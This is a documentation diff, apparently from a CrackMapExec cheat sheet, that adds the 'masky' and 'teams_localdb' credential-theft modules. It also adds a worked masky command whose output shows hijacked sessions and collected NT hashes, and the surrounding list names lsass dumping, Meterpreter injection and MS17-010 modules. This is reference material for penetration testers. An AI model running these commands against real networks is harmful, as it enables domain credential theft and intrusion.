@@ -170,6 +170,7 @@ The modules below can be used with the `-M` option.
 [*] keepass_discover          Search for KeePass-related files and process.
 [*] keepass_trigger           Set up a malicious KeePass trigger to export the database in cleartext.
 [*] lsassy                    Dump lsass and parse the result remotely with lsassy
+[*] masky                     Remotely dump domain user credentials via an ADCS and a KDC
 [*] met_inject                Downloads the Meterpreter stager and injects it into memory
 [*] ms17-010                  MS17-010, /!\ not tested oustide home lab
 [*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
@@ -184,6 +185,7 @@ The modules below can be used with the `-M` option.
 [*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
 [*] spider_plus               List files on the target server (excluding `DIR` directories and `EXT` extensions) and save them to the `OUTPUT` directory if they are smaller then `SIZE`
 [*] spooler                   Detect if print spooler is enabled or not
+[*] teams_localdb             Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process
 [*] test_connection           Pings a host
 [*] uac                       Checks UAC status
 [*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
@@ -456,6 +458,20 @@ SMB         10.10.10.15   445    SRV_FS         [*] Windows 10.0 Build 19041 x64
 SMB         10.10.10.15   445    SRV_FS         [+] OFFSEC.NL\johndo:Welkom1234!
 SLINKY      10.10.10.15   445    SRV_FS         [+] Found writable share: example
 SLINKY      10.10.10.15   445    SRV_FS         [+] Deleted LNK file on the example share
+```
+
+### Exploit ADCS to retrieve NTLM hashes for all connected users (masky)
+
+```plain
+$ cme smb 10.10.10.8 -u john-adm -p Welkom1234! -M masky -0 CA='ADCS01.offsec.nl\offsec-ADCS01-CA"
+SMB     10.10.10.8  445     ADCS01          [*] Windows 10.0 Build 20348 x64 (name: ADCS01) (domain: offsec.nl) (signing: False) (SMBv1: False)
+SMB     10.10.10.8  445     ADCS01          [+] offsec.nl\john-adm: Welkom1234! (Pwn3d! )
+MASKY   10.10.10.8  445     ADCS01          [*] Running Masky on the targeted host
+MASKY   10.10.10.8  445     ADCS01          [*] 2 session(s) successfully hijacked
+MASKY   10.10.10.8  445     ADCS01          [*] Attempting to retrieve NT hash(es) via PKINIT
+MASKY   10.10.10.8  445     ADCS01          offsec\john-adm 97f2592347d8fbe42be381726ff9ea83
+MASKY   10.10.10.8  445     ADCS01          offsec\administrator 97f2592347d8fbe42be381726ff9ea83
+MASKY   10.10.10.8  445     ADCS01          [+] 2 NT hash(es) successfully collected
 ```
 
 ### URL list
